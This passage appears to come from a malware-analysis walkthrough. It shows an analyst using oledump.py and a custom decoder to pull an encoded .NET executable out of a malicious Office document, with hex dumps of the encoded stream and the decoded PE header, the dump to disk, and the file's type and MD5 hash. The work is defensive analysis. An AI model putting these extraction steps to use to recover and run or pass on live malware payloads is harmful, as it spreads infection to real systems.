00000B20: 30 30 26 48 30 30 26 48  30 30 26 48 30 32 26 48  00&H00&H00&H02&H
00000B30: 30 30 26 48 30 30 26 48  30 34 26 48 30 30 26 48  00&H00&H04&H00&H
00000B40: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
00000B50: 30 30 26 48 30 30 26 48  30 34 26 48 30 30 26 48  00&H00&H04&H00&H
00000B60: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
00000B70: 30 30 26 48 30 30 26 48  30 30 26 48 36 30 26 48  00&H00&H00&H60&H
...
```

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.bin -s 14 -D decoder_ah.py | more
00000000: 4D 5A 90 00 03 00 00 00  04 00 00 00 FF FF 00 00  MZ..............
00000010: B8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  ........@.......
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 80 00 00 00  ............<80>...
00000040: 0E 1F BA 0E 00 B4 09 CD  21 B8 01 4C CD 21 54 68  ........!..L.!Th
00000050: 69 73 20 70 72 6F 67 72  61 6D 20 63 61 6E 6E 6F  is program canno
00000060: 74 20 62 65 20 72 75 6E  20 69 6E 20 44 4F 53 20  t be run in DOS 
00000070: 6D 6F 64 65 2E 0D 0D 0A  24 00 00 00 00 00 00 00  mode....$.......
00000080: 50 45 00 00 4C 01 03 00  58 8D 91 54 00 00 00 00  PE..L...X..T....
00000090: 00 00 00 00 E0 00 02 01  0B 01 08 00 00 F0 00 00  ................
000000A0: 00 08 00 00 00 00 00 00  DE 0F 01 00 00 20 00 00  ............. ..
000000B0: 00 20 01 00 00 00 40 00  00 20 00 00 00 02 00 00  . ....@.. ......
000000C0: 04 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  ................
000000D0: 00 60 01 00 00 02 00 00  00 00 00 00 02 00 00 00  .`..............
000000E0: 00 00 10 00 00 10 00 00  00 00 10 00 00 10 00 00  ................
000000F0: 00 00 00 00 10 00 00 00  00 00 00 00 00 00 00 00  ................
00000100: 90 0F 01 00 4B 00 00 00  00 20 01 00 E8 05 00 00  ....K.... ......
00000110: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000120: 00 40 01 00 0C 00 00 00  00 00 00 00 00 00 00 00  .@..............
00000130: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000150: 00 00 00 00 00 00 00 00  00 20 00 00 08 00 00 00  ......... ......
00000160: 00 00 00 00 00 00 00 00  08 20 00 00 48 00 00 00  ......... ..H...
00000170: 00 00 00 00 00 00 00 00  2E 74 65 78 74 00 00 00  .........text...
00000180: E4 EF 00 00 00 20 00 00  00 F0 00 00 00 02 00 00  ..... ..........
00000190: 00 00 00 00 00 00 00 00  00 00 00 00 20 00 00 60  ............ ..`
000001A0: 2E 72 73 72 63 00 00 00  E8 05 00 00 00 20 01 00  .rsrc........ ..
000001B0: 00 06 00 00 00 F2 00 00  00 00 00 00 00 00 00 00  ................
000001C0: 00 00 00 00 40 00 00 40  2E 72 65 6C 6F 63 00 00  ....@..@.reloc..
000001D0: 0C 00 00 00 00 40 01 00  00 02 00 00 00 F8 00 00  .....@..........
000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 40 00 00 42  ............@..B
000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000200: C0 0F 01 00 00 00 00 00  48 00 00 00 02 00 05 00  ........H.......
00000210: 8C B2 00 00 04 5D 00 00  03 00 00 00 50 00 00 06  .....]......P...
00000220: 30 61 00 00 59 51 00 00  00 00 00 00 00 00 00 00  0a..YQ..........
00000230: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
...
```

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.bin -s 14 -D decoder_ah.py --dump > ../d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.exe

eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ file ../d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.exe 
../d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows

eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ md5 ../d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.exe
MD5 (../d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.exe) = 5cd40560a53fda5b32c35adfcdfca3e1
```

